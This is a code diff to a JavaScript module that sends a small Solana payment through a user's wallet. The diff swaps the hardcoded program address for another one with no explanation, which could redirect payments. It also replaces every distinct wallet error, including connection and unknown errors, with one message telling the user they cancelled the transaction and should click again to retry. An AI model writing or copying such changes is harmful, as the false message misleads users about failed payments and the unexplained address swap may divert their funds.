@@ -1,7 +1,7 @@
 import { PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL, Connection, TransactionInstruction } from "@solana/web3.js";
 
 // DEBUG: hardcoded for now; replace with REACT_APP_prgoram_ADDRESS later
-const PROGRAM_ADDRESS = "FSNCrDoTdNxaESEzp6gUzytffFPTx1qyARz8N9Wj8zs4";
+const PROGRAM_ADDRESS = "BVT6EbHksArZ1KWELoG1dT3g6tYNYiVHv6YET2XaeBgS";
 
 const TARGET_USD = 0.1; // $0.10
 
@@ -188,12 +188,10 @@ export const sendSolana = async (connection, publicKey, sendTransaction) => {
     } catch (walletError) {
       console.error("Wallet sendTransaction error:", walletError);
       // Handle specific wallet errors
-      if (walletError?.code === 4001) {
-        return [false, null, null, "Transaction rejected by wallet"];
-      } else if (walletError?.message?.includes("User rejected the request")) {
-        return [false, null, null, "Transaction rejected by wallet"];
+      if (walletError?.code === 4001 || walletError?.message?.includes("User rejected the request")) {
+        return [false, null, null, "Transaction cancelled. You cancelled the transaction. Click box again to retry."];
       } else if (walletError?.name === "WalletSendTransactionError") {
-        return [false, null, null, "Wallet connection error. Please check your wallet and try again."];
+        return [false, null, null, "Transaction cancelled. You cancelled the transaction. Click box again to retry."];
       } else if (walletError?.message) {
         // Check for common wallet error patterns
         if (walletError.message.includes("disconnected") || walletError.message.includes("not connected")) {
@@ -203,9 +201,9 @@ export const sendSolana = async (connection, publicKey, sendTransaction) => {
         } else if (walletError.message.includes("Missing or invalid parameters")) {
           return [false, null, null, "Transaction parameters error. Please try again."];
         }
-        return [false, null, null, `Wallet error: ${walletError.message}`];
+        return [false, null, null, `Transaction cancelled. You cancelled the transaction. Click box again to retry.`];
       } else {
-        return [false, null, null, "Unknown wallet error occurred. Please check your wallet and try again."];
+        return [false, null, null, "Transaction cancelled. You cancelled the transaction. Click box again to retry."];
       }
     }
 
